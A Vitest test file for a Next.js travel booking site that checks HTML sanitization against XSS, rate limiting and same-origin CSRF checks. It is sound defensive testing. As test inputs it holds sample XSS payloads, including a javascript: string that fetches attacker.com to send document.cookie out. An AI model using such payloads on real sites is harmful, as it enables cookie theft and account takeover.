import { describe, it, expect } from "vitest";
import { sanitizeText, sanitizeObject, escapeHtml } from "../src/lib/sanitize";
import { checkRateLimit } from "../src/lib/rate-limit";
import { validateSameOrigin } from "../src/lib/security";
import { NextRequest } from "next/server";

describe("Security & Hardening Tests (XSS, Rate Limiting, CSRF)", () => {
  describe("Input Sanitization & XSS Prevention", () => {
    it("should strip malicious <script> tags and embedded payloads", () => {
      const maliciousInput = '<script>alert("XSS")</script>Kerala Backwaters';
      const sanitized = sanitizeText(maliciousInput);
      expect(sanitized).toBe("Kerala Backwaters");
      expect(sanitized).not.toContain("<script>");
      expect(sanitized).not.toContain("alert");
    });

    it("should strip dangerous event handlers like onerror and onload", () => {
      const payload = '<img src="x" onerror="alert(1)">Houseboat Trip';
      const sanitized = sanitizeText(payload);
      expect(sanitized).toBe("Houseboat Trip");
      expect(sanitized).not.toContain("onerror");
    });

    it("should strip javascript: pseudo-protocol strings", () => {
      const payload = 'javascript:fetch("https://attacker.com/steal?cookie="+document.cookie)';
      const sanitized = sanitizeText(payload);
      expect(sanitized).not.toContain("javascript:");
    });

    it("should properly escape HTML characters for safe rendering", () => {
      const input = '<div class="test">"Aroha" & \'Travels\'</div>';
      const escaped = escapeHtml(input);
      expect(escaped).toBe("&lt;div class=&quot;test&quot;&gt;&quot;Aroha&quot; &amp; &#039;Travels&#039;&lt;/div&gt;");
    });

    it("should recursively sanitize nested objects and arrays", () => {
      const rawObject = {
        name: '<b>John</b><script>alert(1)</script>',
        destinations: ['<script>evil()</script>Munnar', 'Alleppey'],
        meta: {
          note: '<iframe src="evil.com"></iframe>Hello',
        },
      };

      const cleaned = sanitizeObject(rawObject);
      expect(cleaned.name).toBe("John");
      expect(cleaned.destinations[0]).toBe("Munnar");
      expect(cleaned.meta.note).toBe("Hello");
    });
  });

  describe("Rate Limiting Engine", () => {
    it("should allow requests within configured rate limit threshold", () => {
      const testKey = "192.168.1.100";
      const result1 = checkRateLimit(testKey, "test_action", 3, 60000);
      expect(result1.allowed).toBe(true);
      expect(result1.remaining).toBe(2);

      const result2 = checkRateLimit(testKey, "test_action", 3, 60000);
      expect(result2.allowed).toBe(true);
      expect(result2.remaining).toBe(1);
    });

    it("should throttle and block requests when limit is exceeded", () => {
      const testKey = "192.168.1.200";
      // Exhaust 2 attempts
      checkRateLimit(testKey, "throttle_test", 2, 60000);
      checkRateLimit(testKey, "throttle_test", 2, 60000);

      // Third attempt must be blocked
      const blockedResult = checkRateLimit(testKey, "throttle_test", 2, 60000);
      expect(blockedResult.allowed).toBe(false);
      expect(blockedResult.remaining).toBe(0);
      expect(blockedResult.resetSeconds).toBeGreaterThan(0);
    });
  });

  describe("CSRF & Same-Origin Protection", () => {
    it("should allow safe read-only GET requests regardless of origin", () => {
      const req = new NextRequest("http://localhost:3000/api/packages", {
        method: "GET",
        headers: { origin: "https://external-site.com" },
      });
      const check = validateSameOrigin(req);
      expect(check.valid).toBe(true);
    });

    it("should reject cross-origin POST mutations from different origins", () => {
      const req = new NextRequest("http://localhost:3000/api/enquiries", {
        method: "POST",
        headers: {
          origin: "https://malicious-attacker.com",
          host: "localhost:3000",
        },
      });
      const check = validateSameOrigin(req);
      expect(check.valid).toBe(false);
      expect(check.reason).toContain("Cross-origin request rejected");
    });

    it("should allow POST mutations originating from the same host", () => {
      const req = new NextRequest("http://localhost:3000/api/enquiries", {
        method: "POST",
        headers: {
          origin: "http://localhost:3000",
          host: "localhost:3000",
        },
      });
      const check = validateSameOrigin(req);
      expect(check.valid).toBe(true);
    });
  });
});

